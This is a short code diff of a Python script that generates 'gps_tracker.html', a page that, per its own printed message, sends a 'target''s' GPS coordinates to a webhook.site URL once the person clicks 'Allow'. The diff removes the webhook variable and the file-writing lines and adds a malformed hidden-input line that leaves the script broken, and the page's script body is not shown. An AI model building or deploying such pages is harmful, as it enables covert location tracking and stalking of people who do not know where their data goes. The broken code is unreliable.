@@ -1,5 +1,4 @@
-# 1. PASTE YOUR WEBHOOK URL HERE
-WEBHOOK_URL = "https://webhook.site/7275cfa3-36ae-4122-9d75-13625ecd9d04"
+ <input type="hidden"> "https://webhook.site/7275cfa3-36ae-4122-9d75-13625ecd9d04"
 
 html_content = f"""
 <!DOCTYPE html>
@@ -54,12 +53,3 @@ html_content = f"""
     </script>
 </body>
 </html>
-"""
-
-# Save the updated file
-with open("gps_tracker.html", "w") as f:
-    f.write(html_content)
-
-print("Updated 'gps_tracker.html' created.")
-print(f"When the target clicks 'Allow', coordinates will appear at: {WEBHOOK_URL}")
-
